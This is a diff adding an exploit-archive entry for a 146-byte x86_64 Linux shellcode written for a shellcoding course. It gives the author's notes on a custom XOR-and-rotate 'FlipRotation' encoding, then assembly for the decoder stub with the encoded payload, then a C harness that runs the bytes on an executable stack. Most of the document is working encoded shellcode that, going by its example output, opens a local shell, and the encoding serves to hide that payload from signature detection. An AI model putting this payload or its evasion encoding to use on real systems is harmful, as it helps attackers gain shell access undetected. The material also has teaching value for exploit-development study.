@@ -1,0 +1,114 @@
+id: 38466
+date: 04/03/2023
+title: FlipRotation v1.0 decoder - Shellcode (146 bytes)
+author: Eduardo Silva
+cves: 
+
+## Exploit Title: FlipRotation v1.0 decoder - Shellcode (146 bytes)
+## Exploit Author: Eduardo Silva
+## Date: 2022-12-31
+## Tested on: Linux x86_64 SMP Debian 4.19.260-1
+## SLAE/Student ID: PA-31319
+## Webpage: https://0xnibbles.github.io/
+## Twitter: @0xnibbles
+## Course: This shellcode was created for the x86 Assembly Language and Shellcoding on Linux (SLAE32) Course offered at pentesteracademy.com.
+## Description: The inspiration for this algorithm was the known CBC bit-flipping attack but applying a simple variation to our context.
+##
+##			More specifically, the steps are
+##
+##			1 - We pick each shelcode byte and flip the last bit using a xor operation - flipped_shellbyte = shellbyte ^ 0x01
+##			2 - Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of interations) of the loop at that time.
+##			3 - If we rotate right we append 0x2 afther the encoded byte and if we rotate left we append 0xff
+##			4 -	Put the byte 0xa0 as the shellcode end marker
+##
+##			More info at https://0xnibbles.github.io/posts/slae_32_assignment_4/ - the 64 bit version has the same logic as 32 bit
+##
+## Example:
+##       $ ./shellcode
+##       Shellcode Length: 146     
+##       id
+##       uid=1000 ...
+##
+########################################################################
+
+global _start
+
+section .text
+_start:
+
+	jmp decoder
+	EncodedShellcode: db 0x49,0xff,0x18,0x02,0x7,0xff,0x8a,0xff,0x94,0xff,0xd5,0x02,0xb8,0x02,0xb1,0xff,0x68,0x02,0xde,0xff,0x8b,0x02,0xc5,0x02,0x27,0x02,0x2d,0xff,0x49,0x02,0xa4,0xff,0x88,0x02,0x73,0x02,0x45,0xff,0x4a,0xff,0x88,0x02,0x7c,0xff,0x59,0x02,0xa4,0xff,0x88,0x02,0xcf,0xff,0x25,0xff,0x50,0x02,0x1c,0xff,0xd1,0x02,0x38,0x02,0x8,0x02,0xa0,0xa0 ; 0xa0 is the stop marker
+
+decoder:
+
+	lea rsi, [rel EncodedShellcode]
+	lea rdi, [rsi+1]	; pointing to second byte (0x02) from shellcode
+	xor rax, rax
+	mul rax					; zeroes edx
+	mov al,	1 
+	xor rcx, rcx
+	xor rbx, rbx
+	
+
+decode:
+	mov bl, byte [rsi + rax]	; mov parity byte to bl
+	xor bl, 0xa0				; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
+	jz short EncodedShellcode	; reached the marker if Zero Flag not set
+
+	xor bl, 0x5f	; if equal parity is even (0xff)
+	mov bl, byte [rsi + rdx] 
+	jnz odd
+
+even:	; rotate right
+
+	ror bl, cl
+	jmp short bitFlip
+
+odd: 	; rotate left
+
+	rol bl, cl
+
+bitFlip:
+
+	xor bl, 0x01
+
+restore_next_byte:
+
+	mov byte [rsi + rdx], bl	; replaces the original byte
+	mov bl, byte [rsi + rax+1] ; mov next shellbyte
+	mov byte [rdi], bl
+	inc rdi
+	add al, 2
+	inc dl
+	inc cl 
+
+	; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). 
+
+	cmp cl, 0x08	; if equal ZF will be set meaning we have a complete rotation
+	jnz decode	; $+2 ; jump if rotation is not complete
+	xor rcx, rcx	; if rotation is complete and reset cl to start again the "circular array"
+
+	jmp short decode
+
+##############################################
+
+// Filename: shellcode.c
+// Compile:  gcc -z execstack -fno-stack-protector shellcode.c -o shellcode
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x42\x49\xff\x18\x02\x07\xff\x8a\xff\x94\xff\xd5\x02\xb8\x02\xb1\xff\x68\x02\xde\xff\x8b\x02\xc5\x02\x27\x02\x2d\xff\x49\x02\xa4\xff\x88\x02\x73\x02\x45\xff\x4a\xff\x88\x02\x7c\xff\x59\x02\xa4\xff\x88\x02\xcf\xff\x25\xff\x50\x02\x1c\xff\xd1\x02\x38\x02\x08\x02\xa0\xa0\x48\x8d\x35\xb7\xff\xff\xff\x48\x8d\x7e\x01\x48\x31\xc0\x48\xf7\xe0\xb0\x01\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x06\x80\xf3\xa0\x74\x9d\x80\xf3\x5f\x8a\x1c\x16\x75\x04\xd2\xcb\xeb\x02\xd2\xc3\x80\xf3\x01\x88\x1c\x16\x8a\x5c\x06\x01\x88\x1f\x48\xff\xc7\x04\x02\xfe\xc2\xfe\xc1\x80\xf9\x08\x75\xd0\x48\x31\xc9\xeb\xcb";
+
+
+main() {
+
+	printf("Shellcode Length: %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+#  0day.today [2023-04-19]  #
